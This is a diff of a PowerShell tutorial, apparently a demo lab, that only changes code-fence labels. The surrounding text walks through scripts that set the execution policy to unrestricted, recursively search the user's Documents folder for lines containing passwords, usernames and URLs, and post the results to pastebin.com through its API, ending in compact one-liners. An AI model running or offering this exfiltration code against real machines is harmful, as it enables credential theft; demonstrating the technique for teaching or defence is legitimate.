@@ -9,14 +9,14 @@ Go to the folder where you previously created logindata.ps1 and create a new fil
 
 You might have to launch powershell as administrator first to change the set-executionpolicy to "unrestricted"
 
-```
+```Powershell
 set-executionpolicy unrestricted
 ```
 
 1. Observe the results. You will see an URL
 2. Visit this URL
 
-```
+```Powershell
 #Demo 1, Something easy. Userkey won't be used yet so everything is anonymous
 . .\logindata.ps1
 $Content    =   Invoke-WebRequest -Uri "https://ipinfo.io/json"
@@ -51,7 +51,7 @@ This means we will use 2 keys​:
 ### Userkey creation
 
 Create a new file called `get-apiuserkey.ps1`, using the code below.
-```
+```Powershell
 $DevKey     = "PUT-DEV-KEY-HERE"
 $Username   = "PUT-PASTEBIN-USERNAME-HERE"
 $Password   = "PUT-PASTEBIN-PASSWORD-HERE"
@@ -76,7 +76,7 @@ Once this is done… we’re cooking!
 For demo purposes we're going to create 2 dummy files: `password.txt` and `secrets.txt` put these 2 files in your documents folder: `C:\Users\$env:username\Documents`
 
 password.txt has the following contents
-```
+```Powershell
 PUT THIS FILE IN C:\Users\$env:username\Documents
 I do silly things like sometimes putting passwords in files. 
 ```
@@ -90,7 +90,7 @@ https://www.example.com/login-or-something
 ```
 # Second demo
 Create a new file called "new-pastebin2.ps1" and copy paste the following data in it:
-```
+```Powershell
 
 #Demo 2, let's grab some passwords from local files!
 . .\logindata.ps1
@@ -116,7 +116,7 @@ But there seems to be a problem?
 Powershell stores the data in an object. Which is not bad but invoke-webrequest doesn’t understand it and thus the parsing is bad.
 Let’s convert the data to a format which will work.
 Create new-pastebin3.ps1 and observe the difference with new-pastebin2.ps1
-```
+```Powershell
 . .\logindata.ps1
 $Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path)
 $Title      =   "pastebin3"
@@ -143,14 +143,14 @@ Luckily, we can do this by using “;” in powershell
 Create new-pastebin4.ps1 and new-pastebin5.ps1
 
 new-pastebin4.ps1
-```
+```Powershell
 . .\logindata.ps1
 $Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin4"
 $Body = @{ api_dev_key=$DevKey; api_user_key=$UserKey; api_paste_name=$Title;api_paste_code=$Content;api_paste_private="2";api_option="paste";}
 Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
 ```
 new-pastebin5.ps1
-```
+```Powershell
 $DevKey="PUT-DEVKEY-HERE";$UserKey="PUT-USER-KEY-HERE"
 $Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin5"
 $Body = @{ api_dev_key=$DevKey; api_user_key=$UserKey; api_paste_name=$Title;api_paste_code=$Content;api_paste_private="2";api_option="paste";}
